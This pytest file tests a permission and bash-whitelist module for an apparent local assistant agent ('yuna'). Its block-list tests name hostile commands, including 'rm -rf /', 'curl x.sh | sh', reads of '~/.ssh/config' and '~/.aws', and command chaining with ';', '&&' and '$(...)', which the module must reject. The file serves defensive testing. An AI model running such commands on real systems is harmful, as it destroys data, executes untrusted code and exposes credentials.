import pytest
from tools.permisos import check_permission, PermissionLevel, is_bash_allowed

def test_permission_levels():
    assert check_permission("buscar_archivos") == PermissionLevel.SAFE
    assert check_permission("organizar_archivos") == PermissionLevel.CONFIRM
    assert check_permission("ejecutar_bash") == PermissionLevel.DANGEROUS
    assert check_permission("inexistente") == PermissionLevel.DANGEROUS

def test_bash_whitelist():
    assert is_bash_allowed("ls -la") is True
    assert is_bash_allowed("cat archivo.txt") is True
    assert is_bash_allowed("rm -rf /") is False
    assert is_bash_allowed("curl x.sh | sh") is False


def test_bash_blocks_shell_operators():
    assert is_bash_allowed("ls; echo hola") is False
    assert is_bash_allowed("ls && echo hola") is False
    assert is_bash_allowed("ls | cat") is False
    assert is_bash_allowed("ls $(echo hola)") is False


def test_bash_blocks_sensitive_paths():
    assert is_bash_allowed("ls /") is False
    assert is_bash_allowed("ls /etc") is False
    assert is_bash_allowed("ls /Users") is False
    assert is_bash_allowed("ls ../../../") is False
    assert is_bash_allowed("cat /etc/hosts") is False
    assert is_bash_allowed("cat ~/.ssh/config") is False
    assert is_bash_allowed("find /") is False


def test_bash_allows_yuna_paths():
    assert is_bash_allowed("ls ~/yuna") is True
    assert is_bash_allowed("du -sh ~/yuna") is True
    assert is_bash_allowed("ls data") is True

def test_bash_allows_personal_work_directories():
    assert is_bash_allowed("ls ~/Downloads") is True
    assert is_bash_allowed("ls ~/Desktop") is True
    assert is_bash_allowed("ls ~/Documents") is True
    assert is_bash_allowed("ls ~/Pictures") is True
    assert is_bash_allowed("ls ~/Movies") is True
    assert is_bash_allowed("ls ~/Music") is True


def test_bash_blocks_private_home_directories():
    assert is_bash_allowed("ls ~/.ssh") is False
    assert is_bash_allowed("ls ~/.aws") is False
    assert is_bash_allowed("ls ~/.config") is False
    assert is_bash_allowed("ls ~/Library") is False


def test_detectar_descargas_es_safe():
    assert check_permission("detectar_descargas") == PermissionLevel.SAFE
